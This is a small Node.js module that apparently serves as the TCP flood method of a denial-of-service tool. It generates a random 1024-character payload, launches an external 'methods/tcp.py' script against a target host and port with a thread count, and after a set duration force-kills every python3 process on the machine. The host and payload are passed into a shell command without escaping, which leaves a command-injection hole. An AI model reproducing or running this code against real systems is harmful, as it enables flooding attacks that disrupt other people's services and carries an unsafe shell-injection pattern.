function generateRandomString(length) {
  let result = "";
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
const exec = require("child_process").exec;
function tcp(host, port = 22, duration = 10, threads = 1, payload) {
  if (!payload) payload = generateRandomString(1024);

  exec(
    "python3 methods/tcp.py " +
      host +
      " " +
      port +
      " 100 " +
      threads +
      " " +
      payload
  );
  setTimeout(() => {
    exec("killall -9 python3");
  }, duration * 1000);
}

module.exports = tcp;
